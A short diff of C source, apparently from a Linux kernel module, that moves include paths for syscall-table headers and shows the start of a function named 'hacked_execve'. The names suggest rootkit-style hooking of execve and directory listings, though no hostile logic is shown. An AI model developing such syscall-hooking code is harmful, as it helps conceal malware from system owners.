@@ -24,9 +24,9 @@
 
 #include "logging.h"
 #include "ctrl/ctrl.h"
-#include "systbl/hooked_funcs.h"
-#include "systbl/syscall_utils.h"
 #include "systbl/details/dirent_hack.h"
+#include "systbl/details/hacked_funcs.h"
+#include "systbl/details/syscall_utils.h"
 
 asmlinkage long hacked_execve(const struct pt_regs* p_regs)
 {
